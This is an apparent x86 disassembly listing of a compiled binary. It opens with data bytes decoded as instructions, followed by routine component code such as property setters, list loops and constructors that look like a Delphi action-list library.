inc ebp
add [ eax ] ch
add [ eax ] al
aam 0x90
inc ebp
add [ eax ] bh
adc [ edx ] eax
mov al 0x33
inc eax
add [ edx + ecx + 0x33b80042 ] cl
add [ eax ] al
inc ecx
add [ esp + ecx * 4 + 0x41 ] dl
add [ eax + ebx * 4 ] cl
inc ecx
add [ edi + edx * 4 ] al
inc ecx
add [ eax ] bl
cmpsd [ esi ] [ edi ]
inc ecx
add [ edi + 0x41 ] cl
inc eax
add [ eax ] ch
xor [ eax ] eax
jo r-xdata
add [ ebx + esi + 0x33b80040 ] dh
inc eax
add [ ebx + esi + 0x310c0040 ] ch
je r-xdata
inc edx
add ah bl
cdq
inc ebp
add [ eax ] ch
push cs
inc edx
add [ eax ] ah
cmovb eax [ eax ]
push eax
adc [ edx ] eax
cmp [ esi ] cl
inc edx
add [ eax ] dh
push cs
inc edx
add [ eax + 0x11 ] bl
inc edx
add [ eax + ebx * 4 + 0x45 ] cl
add [ eax - 0x66 ] ah
inc ebp
add [ ecx + ebx * 4 + 0x540b0045 ] bl
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul esi [ ebx + 0x74 ] r-xdata
pop es
or edx [ ecx + eax * 2 + 0x63 ]
je r-xdata
sbb [ esi ] cl
nop
inc ebp
add [ eax ] bl
add bh bh
xchg esp eax
fwait
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add eax [ eax ]
add eax 0x74617453
nop
push ebp
inc ecx
add [ eax ] al
add bh bh
inc eax
add [ eax ] al
inc [ ecx ]
add [ eax - 0x59 ] dl
inc ecx
popad
je r-xdata
add [ eax ] ch
xor [ eax ] eax
sbb [ ebp - 0x622fffbb ] 0x45
inc ebx
jne r-xdata
xor eax [ eax ]
or al 0x31
xor eax [ eax ]
lodsb [ esi ]
add [ eax + 0x4f080007 ] al
outsb
push ebp
jo r-xdata
inc ebx
push 0x65676e61
cmp al 0x90
inc ebp
add [ eax ] dl
add bh bh
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
inc ecx
add [ edi + 0x41 ] dl
add al dh
0xa8c80041 0x41
and al 0xa9
inc ecx
add al bh
test eax 0xa23c0041
inc ecx
add [ edx + ebp * 4 ] dh
inc ecx
add [ eax - 0x5bffbe56 ] ch
mov [ 0xffffffffa4d80045 ] eax
inc ecx
add [ esi + edx * 4 + 0x41 ] cl
add [ ebp + 0x41 ] dh
add [ ebp - 0x59dfffbf ] dh
inc ecx
add [ edx + ebx * 4 - 0x584fffbf ] bl
inc ecx
add [ eax ] dh
popfd
inc ecx
add [ esi + ebx * 4 ] al
inc ecx
add ah ch
cmpsd [ esi ] [ edi ]
inc ecx
add ah bh
cmpsd [ esi ] [ edi ]
inc ecx
add [ eax - 0x62 ] ch
inc ecx
add [ esi + ebx * 4 - 0x6097ffbf ] bh
inc ecx
add [ eax ] al
mov eax [ 0xffffffffa1580041 ]
inc ecx
add ah ch
mov eax [ 0xffffffffa53c0041 ]
inc ecx
add [ eax - 0x5b ] bl
inc ecx
add [ eax - 0x58 ] dl
inc ecx
add [ eax + 0x600041a6 ] ah
stosb [ edi ]
inc ecx
add [ eax - 0x56 ] dh
inc ecx
add [ 0x6f685354 ] cl
jb r-xdata
lea eax [ eax ]
mov [ ebx + 0x45 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor al 0x94
inc ebp
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax + edx + 0x640040 ] ch
add [ eax ] al
lodsb [ esi ]
adc [ eax ] al
js r-xdata
inc edx
add ah dh
xchg edi eax
inc ebp
add ah al
mov al [ 0xffffffffa05c0045 ]
inc ebp
add [ eax + 0xe0045a3 ] bl
add [ eax + 0xd ] al
inc edx
add [ eax - 0x75 ] dh
inc ecx
add [ eax ] bl
push cs
inc eax
add [ eax - 0x2fffba63 ] al
popfd
inc ebp
dec esp
imul esi [ ebx + 0x74 ] 0x9434c08b
inc ebp
add [ edi ] al
or eax 0x6f685354
jb r-xdata
add [ eax ] al
lodsb [ esi ]
adc [ eax ] al
jl r-xdata
inc edx
sbb [ esi ] cl
inc ebx
jne r-xdata
add [ eax ] al
add al [ eax ]
out dx al
add [ ebx + edx + 0x42 ] dh
add [ eax - 0x63ffba6a ] ah
mov [ 0x11500045 ] al
inc edx
add [ eax ] bh
push cs
inc edx
add [ eax ] dh
push cs
inc edx
add [ eax + 0x11 ] bl
inc edx
add [ ebx * 4 + 0x14340045 ] ch
inc edx
add al bl
adc eax [ edx ]
insb
adc eax [ edx ]
pushfd
adc eax [ edx ]
jo r-xdata
dec esp
imul esi [ ebx + 0x74 ] r-xdata
lodsb [ esi ]
popad
inc ecx
add [ eax ] al
add [ eax ] cl
inc ecx
arpl [ esi + ebp * 2 + 0x4c ] si
imul esi [ ebx + 0x74 ] 0x94a40000
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bh
xchg esp eax
inc ebp
add [ edx * 4 + 0x45 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb dl [ ebp - 0x6ad7ffbb ]
inc ebp
add [ eax + 0x18000000 ] ah
pop [ ebp ]
cmp [ ecx ] dl
inc edx
add [ eax - 0x73ffbfcd ] dh
or al [ edx ]
mov eax 0xac004033
xor eax [ eax ]
or al 0x31
inc eax
sub_459564
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
inc edx
add ah al
adc al [ edx ]
xor al 0x9c
inc ebp
add [ eax - 0x64 ] cl
inc ebp
add [ esp + ebx * 4 + 0x45 ] bl
add [ eax - 0x64 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and al 0x96
inc ebp
add [ eax ] bl
add [ eax ] al
add [ eax - 0x5bffbe96 ] dh
xor eax [ eax ]
mov al 0x33
inc eax
add [ ebx + esi + 0x33b80040 ] dh
inc eax
add [ ebx + esi + 0x310c0040 ] ch
inc eax
add [ eax ] ch
xor [ eax ] eax
and al 0x12
inc edx
add [ eax ] ah
adc al [ edx ]
pop eax
adc al [ edx ]
mov eax 0x8c004212
adc al [ edx ]
mov esp 0xdc004212
adc [ edx ] eax
jo r-xdata
inc ebp
add [ esp + ebx * 4 - 0x6367ffbb ] al
inc ebp
add [ esp + ebx * 4 - 0x633fffbb ] ch
inc ebp
add ah dl
pushfd
inc ebp
add al ch
pushfd
inc ebp
add ah bh
pushfd
inc ebp
add [ eax ] al
popfd
inc ebp
add [ ebx * 4 - 0x62f7ffbb ] al
inc ebp
add [ ebx * 4 - 0x62efffbb ] cl
inc ebp
add [ ebx * 4 - 0x62e7ffbb ] dl
inc ebp
add [ ebx * 4 - 0x62dfffbb ] bl
inc ebp
add [ ebx * 4 - 0x62d7ffbb ] ah
inc ebp
add [ ebx ] cl
push esp
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] 0xf1e85653
sahf
cli
dec [ ebx - 0x740f7426 ]
inc esi
pop esp
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_421314
test bl bl
jle r-xdata
mov edx esi
call sub_459a44
pop esi
pop ebx
retn
mov eax esi
call sub_403510
sub_459630
push ebx
push esi
call sub_403528
mov ebx edx
mov esi eax
mov eax [ esi + 0x5c ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_421314
test bl bl
jle r-xdata
mov edx esi
call sub_459a44
pop esi
pop ebx
retn
mov eax esi
call sub_403510
sub_4596a0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_420e28
mov edi [ esi + 0x2c ]
mov eax edi
mov edx [ r-xdata ]
call sub_403300
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebx
call sub_459748
sub_4596d4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax ebx
call sub_459664
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
retn
mov edx [ ebx + 0x5c ]
mov edi [ edx + 0x30 ]
mov edx [ edi + 0x8 ]
test esi esi
jge r-xdata
cmp edx esi
jg r-xdata
xor esi esi
cmp eax esi
je r-xdata
mov esi edx
dec esi
mov edx edi
xchg edx eax
call sub_418198
mov eax [ ebx + 0x5c ]
mov eax [ eax + 0x30 ]
mov ecx ebx
mov edx esi
call sub_418324
sub_45971c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x58 ]
call sub_4042f8
je r-xdata
pop esi
pop ebx
retn
lea eax [ ebx + 0x58 ]
mov edx esi
call sub_403f40
mov eax [ ebx + 0x5c ]
test eax eax
je r-xdata
mov edx [ eax ]
call [ edx + 0x30 ]
sub_459748
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x5c ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
test esi esi
je r-xdata
mov edx ebx
call sub_459a44
mov edx ebx
mov eax esi
call sub_459a24
sub_459770
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_403300
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_459748
sub_45979c
push ebx
push esi
push edi
mov ebx eax
mov edi [ ebx + 0x5c ]
test edi edi
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx ebx
call sub_46ef38
test al al
jne r-xdata
mov edx ebx
mov eax edi
mov si 0xfff3
call sub_403370
test al al
jne r-xdata
mov al 0x1
mov eax ebx
call sub_4213a0
test al al
jne r-xdata
mov ecx ebx
xor edx edx
mov eax 0xb040
call sub_44a570
dec eax
je r-xdata
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_4597f4
push ebx
push esi
push edi
mov ebx eax
mov edi [ ebx + 0x5c ]
test edi edi
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx ebx
call sub_46ef60
test al al
jne r-xdata
mov edx ebx
mov eax edi
mov si 0xfff0
call sub_403370
test al al
jne r-xdata
mov al 0x1
mov eax ebx
call sub_4213bc
test al al
jne r-xdata
mov ecx ebx
xor edx edx
mov eax 0xb03f
call sub_44a570
dec eax
je r-xdata
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_45984c
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_4209c8
mov dl 0x1
mov eax [ r-xdata ]
call sub_403144
mov [ ebx + 0x30 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403144
mov esi eax
mov [ ebx + 0x34 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_4599d0
mov [ ebx + 0x58 ] 0x0
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4034c0
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403518
pop [ fs : 0x0 ]
add esp 0xc
sub_4598b8
push ebx
push esi
push edi
call sub_403528
mov ebx edx
mov edi eax
mov eax [ edi + 0x34 ]
call sub_403174
jmp r-xdata
mov esi [ edi + 0x30 ]
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov eax esi
call sub_418390
call sub_403174
mov eax [ edi + 0x30 ]
call sub_403174
mov edx ebx
and dl 0xfc
mov eax edi
call sub_420a14
test bl bl
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_403510
sub_459908
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx eax
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + esi * 4 ]
mov edx [ eax + 0x4 ]
cmp edx [ ebp - 0x8 ]
jne r-xdata
sub_459950
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_418304
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_403324
mov edx edi
call sub_4596d4
sub_45999c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x38 ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x38 ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x34 ]
call sub_45b294
pop esi
pop ebx
retn
mov edx [ ebx + 0x34 ]
call sub_45b2d8
mov edx ebx
mov eax [ ebx + 0x38 ]
call sub_420a98
sub_4599dc
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_420ce4
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp edi [ esi + 0x38 ]
jne r-xdata
mov eax edi
mov edx [ r-xdata ]
call sub_403300
test al al
je r-xdata
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x34 ]
jmp r-xdata
mov edx edi
mov eax esi
call sub_459a44
sub_459a24
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_41814c
mov [ esi + 0x5c ] ebx
mov edx ebx
mov eax esi
call sub_420a98
pop esi
pop ebx
retn
sub_459a44
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_418444
test eax eax
jl r-xdata
pop esi
pop ebx
retn
xor eax eax
mov [ esi + 0x5c ] eax
sub_459a60
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0x42 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov edx ebx
mov eax [ ebx + 0x44 ]
call [ ebx + 0x40 ]
test [ ebx + 0x1c ] 0x10
je r-xdata
inc esi
xor edi edi
pop edi
pop esi
pop ebx
retn
mov esi [ ebx + 0x4 ]
mov eax esi
mov edx [ r-xdata ]
call sub_403300
test al al
je r-xdata
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ eax ]
call [ edx + 0x30 ]
inc edi
dec esi
jne r-xdata
cmp [ esi + 0x250 ] 0x0
je r-xdata
mov eax [ esi + 0x250 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_459ac8
push ebx
push esi
push edi
push ebp
push ecx
mov esi edx
mov [ esp ] eax
mov eax [ esi + 0x8 ]
call sub_464ca8
mov ebx eax
mov ax [ esi + 0x4 ]
mov edx ebx
call sub_45cb30
mov ebp eax
test bp bp
je r-xdata
xor eax eax
mov eax [ esp ]
mov eax [ eax + 0x30 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
cmp bp [ ebx + 0x84 ]
je r-xdata
mov eax [ esp ]
mov eax [ eax + 0x30 ]
mov eax [ eax + 0x4 ]
mov ebx [ eax + edi * 4 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_403300
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
jmp r-xdata
cmp [ ebx + 0x90 ] 0x0
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_45a370
mov edx ebp
call sub_45a3d0
inc eax
je r-xdata
sub_459b54
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0x4a ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
sub_459b74
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0x52 ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
sub_459b94
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ ebx + 0x58 ]
cmp al [ esp ]
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ esp + 0x1 ] al
mov al [ esp ]
mov [ ebx + 0x58 ] al
cmp al 0x1
je r-xdata
mov eax [ ebx + 0x30 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
cmp [ ebx + 0x62 ] 0x0
je r-xdata
inc esi
xor ebp ebp
mov edx ebx
mov eax [ ebx + 0x64 ]
call [ ebx + 0x60 ]
test edi edi
je r-xdata
dec al
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x44 ]
jmp r-xdata
cmp [ esp + 0x1 ] 0x2
jne r-xdata
test edi edi
je r-xdata
jmp r-xdata
inc ebp
dec esi
jne r-xdata
mov dl [ edi + 0x94 ]
mov eax edi
call sub_459fe4
cmp [ esp ] 0x2
jne r-xdata
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x4 ]
mov edi [ eax + ebp * 4 ]
mov al [ esp ]
sub al 0x1
jb r-xdata
mov al [ edi + 0x6a ]
mov [ edi + 0x94 ] al
mov dl 0x1
mov eax edi
call sub_459fe4
sub_459d2c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4212d0
mov [ esi + 0x6a ] 0x1
mov [ esi + 0x80 ] 0xffffffff
mov [ esi + 0x86 ] 0x1
xor eax eax
mov [ esi + 0x90 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034c0
mov eax esi
pop esi
pop ebx
retn
call sub_403518
pop [ fs : 0x0 ]
add esp 0xc
sub_459d80
push ebx
push esi
call sub_403528
mov ebx edx
mov esi eax
mov eax [ esi + 0x98 ]
call sub_403174
mov eax [ esi + 0x9c ]
call sub_403174
cmp [ esi + 0x90 ] 0x0
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_459630
test bl bl
jle r-xdata
lea eax [ esi + 0x90 ]
call sub_40cfec
pop esi
pop ebx
retn
mov eax esi
call sub_403510
sub_459dd0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_403300
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_418c54
mov edx [ ebx + 0x64 ]
mov edi esi
mov eax edi
call sub_459e7c
mov dl [ ebx + 0x69 ]
mov eax edi
call sub_459edc
mov dl [ ebx + 0x6a ]
mov eax edi
call sub_459fe4
mov edx [ ebx + 0x74 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov edx [ ebx + 0x7c ]
mov eax edi
call sub_45a11c
mov edx [ ebx + 0x80 ]
mov eax edi
call sub_45a17c
mov dx [ ebx + 0x84 ]
mov eax edi
call sub_45a1d8
mov dl [ ebx + 0x86 ]
mov eax edi
call sub_45a23c
push [ ebx + 0x44 ]
push [ ebx + 0x40 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x34 ]
mov eax [ ebx + 0x48 ]
mov [ edi + 0x48 ] eax
mov eax [ ebx + 0x4c ]
mov [ edi + 0x4c ] eax
mov eax [ ebx + 0x38 ]
mov [ edi + 0x38 ] eax
mov eax [ ebx + 0x3c ]
mov [ edi + 0x3c ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_459e7c
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
mov edx [ ebx + 0x64 ]
call sub_4042f8
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
lea eax [ ebx + 0x64 ]
mov edx [ esp ]
call sub_403f40
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x4c ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_403324
test eax eax
je r-xdata
sub_459edc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x68 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x68 ] 0x1
xor edx edx
push ebp
push sub_459fd4
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp bl [ eax + 0x69 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x68 ] 0x0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x69 ] bl
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x6c ] 0x0
jle r-xdata
inc edi
xor esi esi
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x30 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x69 ] 0x0
je r-xdata
inc esi
dec edi
jne r-xdata
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x50 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x5c ]
call sub_459994
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + esi * 4 ]
mov edx [ r-xdata ]
call sub_403324
test eax eax
je r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_403300
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x5c ]
mov edx esi
call sub_459980
mov ebx eax
cmp ebx [ ebp - 0x4 ]
je r-xdata
mov eax [ ebx + 0x6c ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x6c ]
jne r-xdata
xor edx edx
mov eax ebx
call sub_459edc
sub_459fe4
push ebx
push esi
push edi
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ esp ]
cmp al [ ebx + 0x6a ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x5c ]
test eax eax
je r-xdata
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov dl [ eax + 0x58 ]
cmp dl 0x1
jne r-xdata
mov al [ esp ]
mov [ ebx + 0x6a ] al
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
cmp dl 0x2
jne r-xdata
mov al [ esp ]
mov [ ebx + 0x6a ] al
jmp r-xdata
inc edi
dec esi
jne r-xdata
mov dl [ esp ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov [ esp ] 0x1
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_403324
test eax eax
je r-xdata
sub_45a05c
push ebx
push esi
push edi
push ebp
mov ebp edx
mov ebx eax
mov eax ebp
mov edx [ ebx + 0x78 ]
call sub_4042f8
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
lea eax [ ebx + 0x78 ]
mov edx ebp
call sub_403f40
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_4182a8
mov edx ebp
mov ecx [ eax ]
call [ ecx + 0x60 ]
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_4182a8
mov edx [ r-xdata ]
call sub_403300
test al al
je r-xdata
sub_45a0c4
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
cmp eax [ ebx + 0x74 ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ esp ]
mov [ ebx + 0x74 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x5c ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_403324
test eax eax
je r-xdata
sub_45a11c
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
mov edx [ ebx + 0x7c ]
call sub_4042f8
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
lea eax [ ebx + 0x7c ]
mov edx [ esp ]
call sub_403f40
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_403324
test eax eax
je r-xdata
sub_45a17c
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
cmp eax [ ebx + 0x80 ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ esp ]
mov [ ebx + 0x80 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_403324
test eax eax
je r-xdata
sub_45a1d8
push ebx
push esi
push edi
push ecx
mov [ esp ] dx
mov ebx eax
mov ax [ esp ]
cmp ax [ ebx + 0x84 ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov ax [ esp ]
mov [ ebx + 0x84 ] ax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov dx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_403324
test eax eax
je r-xdata
sub_45a23c
push ebx
push esi
push edi
push ebp
mov ebx edx
mov ebp eax
cmp bl [ ebp + 0x86 ]
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebp + 0x50 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov [ ebp + 0x86 ] bl
mov eax ebp
mov edx [ eax ]
call [ edx + 0x30 ]
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebp + 0x50 ]
call sub_4182a8
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x74 ]
mov eax [ ebp + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + esi * 4 ]
mov edx [ r-xdata ]
call sub_403324
test eax eax
je r-xdata
sub_45a29c
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0x8 ]
mov edx [ esi + 0x64 ]
call sub_4042f8
jne r-xdata
xor eax eax
jmp r-xdata
mov ebx [ esi + 0x4 ]
test ebx ebx
je r-xdata
mov ebx eax
mov edx edi
mov eax esi
call sub_420f20
test bl bl
je r-xdata
mov al 0x1
test [ ebx + 0x1c ] 0x1
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0x50 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov edx edi
mov eax esi
call sub_459e7c
sub_45a2e8
push ebx
push ecx
mov [ esp ] 0x1
cmp [ eax + 0x8a ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
sub_45a310
push ebx
mov ebx eax
xor eax eax
mov edx [ ebx + 0x5c ]
test edx edx
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x44 ]
cmp [ ebx + 0x6a ] 0x0
je r-xdata
cmp [ edx + 0x58 ] 0x0
jne r-xdata
cmp [ ebx + 0x6a ] 0x0
